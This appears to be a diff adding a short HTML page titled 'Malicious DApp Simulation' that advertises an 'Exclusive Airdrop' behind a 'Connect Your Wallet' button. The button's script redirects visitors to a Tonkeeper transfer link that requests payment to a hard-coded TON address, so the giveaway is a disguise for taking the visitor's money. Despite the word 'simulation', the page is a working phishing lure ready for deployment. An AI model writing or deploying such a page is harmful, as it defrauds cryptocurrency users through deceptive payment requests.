@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious DApp Simulation</title>
+</head>
+<body>
+    <h1>Welcome to the "Exclusive Airdrop"!</h1>
+    <button id="connectWallet">Connect Your Wallet</button>
+    <script>
+        document.getElementById('connectWallet').onclick = async () => {
+            alert('Connecting to your wallet...');
+
+            // Replace '0xYourContractAddress' with your actual deployed smart contract address
+            const tonKeeperUrl = `https://app.tonkeeper.com/transfer/${encodeURIComponent('EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ')}?amount=${encodeURIComponent('50000000')}&text=${encodeURIComponent('Airdrop')}`;
+            
+            // Redirect to TON Keeper with the transaction details
+            window.location.href = tonKeeperUrl;
+        };
+    </script>
+</body>
+</html>
